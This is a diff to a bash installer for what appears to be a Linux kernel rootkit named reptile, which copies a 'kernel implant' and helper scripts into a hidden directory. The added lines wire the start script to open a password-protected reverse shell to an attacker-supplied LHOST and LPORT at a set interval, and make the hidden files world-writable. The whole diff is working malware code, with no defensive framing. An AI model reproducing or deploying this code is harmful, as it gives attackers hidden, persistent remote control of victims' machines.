@@ -1,6 +1,4 @@
 #!/bin/bash
-#
-# This should be executed by Makefile, don't run it manually!
 
 function random_gen_dec {
 	RETVAL=$(shuf -i 50-99 -n 1)
@@ -31,6 +29,18 @@ cp $PWD/../scripts/bashrc /$HIDE/$HIDE"_rc" && \
 # Create start script
 cp $PWD/../scripts/start /$HIDE/$HIDE"_start" && \
 sed -i s!XXXXX!$TAG_NAME! /$HIDE/$HIDE"_start" && \
+sed -i s!\#CMD!/$HIDE/$HIDE"_cmd"! /$HIDE/$HIDE"_start" && \
+if [ "$CONFIG_RSHELL_ON_START" == "y" ]; then
+	sed -i s!\#SHELL!/$HIDE/$HIDE"_shell"! /$HIDE/$HIDE"_start" && \
+	sed -i s!LHOST!$LHOST! /$HIDE/$HIDE"_start" && \
+	sed -i s!LPORT!$LPORT! /$HIDE/$HIDE"_start" && \
+	sed -i s!PASS!$PASSWORD! /$HIDE/$HIDE"_start" && \
+	sed -i s!INTERVAL!$INTERVAL! /$HIDE/$HIDE"_start" && \
+	true || false;
+fi
+
+# Permissions
+chmod 777 /$HIDE/* && \
 
 # Copy kernel implant
 cp $PWD/../output/reptile /$HIDE/$HIDE && \
